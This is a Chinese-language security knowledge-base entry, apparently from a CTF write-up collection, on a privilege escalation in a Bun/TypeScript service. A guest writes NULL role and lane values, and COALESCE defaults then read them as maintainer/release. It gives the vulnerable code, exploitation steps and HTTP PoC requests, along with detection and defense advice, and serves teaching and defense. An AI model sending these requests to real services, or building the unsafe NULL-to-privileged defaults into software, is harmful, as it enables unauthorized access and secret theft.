---
id: web-generic-auth-coalesce-null-default-privilege-escalation
title: COALESCE 默认值提权：keepRole/keepLane=false 写入 NULL，guest 被当作 maintainer+release
type: scenario
domain: web
path: web/generic/auth
technique: coalesce-null-default-privilege-escalation
tags:
- auth
- authorization
- sql
- coalesce
- null
- privilege-escalation
- bun
- typescript
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:27:09+08:00'
  notes: 已对照原文核对：normalizeSyncRows 中 keepRole/keepLane=false 时不写 role/lane、getEffectiveCapability 用 COALESCE(role,'maintainer')/COALESCE(lane,'release')、guest token 经 /api/caps/sync 制造 NULL 后被当作 maintainer+release、随后 /api/release/execute 读取 RUNNER_KEY 均一致。未验证点：无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-coalesce-null-default-privilege-escalation/
draft: false
kb_aliases:
- COALESCE 提权
- NULL 注入
- keepRole false
- keepLane false
- capability_snapshots
- Bun TypeScript 权限提升
- 默认角色 maintainer
---

## 一句话结论

当权限快照表的 `role`/`lane` 列允许 NULL，而读取权限时用 `COALESCE(role, 'maintainer')`、`COALESCE(lane, 'release')` 给默认值时，普通 guest 只要在同步接口传 `keepRole:false`、`keepLane:false` 让这两列为 NULL，就会被服务端当作 `maintainer + release`，从而通过高权限接口的校验。

## 原理

- 目标服务（Bun + TypeScript）有一个 `POST /api/caps/sync` 接口，允许 guest 同步能力快照。`normalizeSyncRows` 中：
  ```typescript
  const keepRole = input.keepRole !== false;
  const keepLane = input.keepLane !== false;
  const row: Record<string, unknown> = { sid: claims.sid, source, note, stamp: now + i };
  if (keepRole) row.role = 'guest';
  if (keepLane) row.lane = 'public';
  ```
  当 `keepRole:false` 时 `row.role` 不设置，`keepLane:false` 时 `row.lane` 不设置；插入数据库后这两列就是 NULL（列允许 NULL，没有 NOT NULL/默认约束）。
- 权限读取 `getEffectiveCapability` 使用：
  ```sql
  SELECT
    COALESCE(role, 'maintainer') AS role,
    COALESCE(lane, 'release') AS lane,
    ...
  FROM capability_snapshots
  WHERE sid = ${sid}
  ORDER BY id DESC
  LIMIT 1
  ```
  `COALESCE(NULL, 'maintainer')` 返回 `'maintainer'`，`COALESCE(NULL, 'release')` 返回 `'release'`；服务端于是认为该 guest 同时拥有 maintainer 与 release 权限。
- 权限检查通常写成 `role === 'maintainer' && lane === 'release'`；因为读取函数已经把 NULL 替换成高权限默认值，后续检查直接通过。`/api/release/execute` 等高权限接口不再区分“用户本来没有角色”和“用户显式提供了 NULL”。
- 这类漏洞的根因不是 SQL 注入，而是“默认值选择错误 + 允许 NULL + 用户可控地省略字段”三者叠加：COALESCE 的默认值本应是 `guest`/`public` 这样的最低权限，却被写成 `maintainer`/`release`；同时 `keepRole`/`keepLane` 让攻击者能主动制造 NULL。
- 一旦拿到 maintainer+release，攻击者可以调用表达式执行接口，进一步读取 `RUNNER_KEY` 等密钥，完成后续挑战链。

## 触发条件

- 权限/角色/租户等字段存储在数据库，列允许 NULL，且没有 NOT NULL/CHECK/默认值约束。
- 读取权限的 SQL 使用 `COALESCE(column, '<高权限值>')`、`IFNULL`、`NVL` 等，把 NULL 映射成高权限默认值。
- 写入接口允许用户通过布尔开关/可选字段省略该列，从而制造 NULL。
- 权限判断只看读取函数返回的 role/lane，不校验来源/显式赋值。
- 攻击者能获得一个低权限账号/guest token 并访问写入接口。

## 利用步骤

1. 获取 guest token（如 `POST /api/auth/guest`），确认可以访问 `/api/caps/sync`。
2. 发送同步请求，两个操作都设置 `keepRole:false`、`keepLane:false`，让 `role`/`lane` 写成 NULL：
   ```json
   {"ops":[{"source":"test1","keepRole":false,"keepLane":false},
           {"source":"test2","keepRole":false,"keepLane":false}]}
   ```
3. 访问 `/api/session/self`，观察 `recentCaps` 中 `role:null`、`lane:null`；服务端读取时会 COALESCE 成 maintainer/release。
4. 调用需要 maintainer+release 的接口（如 `/api/release/execute`），确认权限检查通过。
5. 继续执行表达式/读取密钥，完成后续利用。

## PoC

```http
POST /api/auth/guest HTTP/1.1
Host: target
```

```http
POST /api/caps/sync HTTP/1.1
Host: target
Authorization: Bearer <guest-token>
Content-Type: application/json

{"ops":[{"source":"test1","keepRole":false,"keepLane":false},
        {"source":"test2","keepRole":false,"keepLane":false}]}
```

```http
GET /api/session/self HTTP/1.1
Host: target
Authorization: Bearer <guest-token>
```

响应中可见 `role: null`、`lane: null`；随后高权限接口按 `COALESCE` 结果放行。

```http
POST /api/release/execute HTTP/1.1
Host: target
Authorization: Bearer <guest-token>
Content-Type: application/json

{"expression":"<表达式>","input":{}}
```

## 变体与关联

- **SQL 函数变体**：`COALESCE`、`IFNULL`、`NVL`、`ISNULL`、`CASE WHEN ... IS NULL THEN 'maintainer'`。
- **字段变体**：role、lane、tenant、is_admin、permission、scope；任何“NULL 被解释为高权限”的默认值都危险。
- **写入变体**：布尔开关省略字段、可选字段不传、批量插入部分列、`undefined`/`null` 序列化差异、mass assignment。
- **关联**：[[web-generic-auth-roleid-roleids-parameter-tampering-admin]]（角色参数篡改提权）；[[web-generic-auth-missing-function-level-role-check]]（缺少功能级角色校验）；[[web-generic-auth-jwt-signature-only-role-bypass]]（JWT 角色伪造）。
- **边界**：列有 NOT NULL/默认值、COALESCE 默认值是最低权限、权限检查显式校验用户来源/角色来源时，本路径失效。

## 检测与防御

- **检测**：同步请求出现 `keepRole:false`/`keepLane:false`；数据库中 role/lane 出现 NULL；guest 会话调用 maintainer/release 接口；权限读取 SQL 使用高权限 COALESCE 默认值。
- **防御**：role/lane 列设 NOT NULL + CHECK + 最低权限默认值；COALESCE 默认值改为 `guest`/`public`；写入时显式赋值，禁止用户控制字段省略。
- **加固**：权限判断同时校验角色来源与快照完整性；对 guest 的能力同步做字段白名单与审计；高权限接口做二次鉴权。
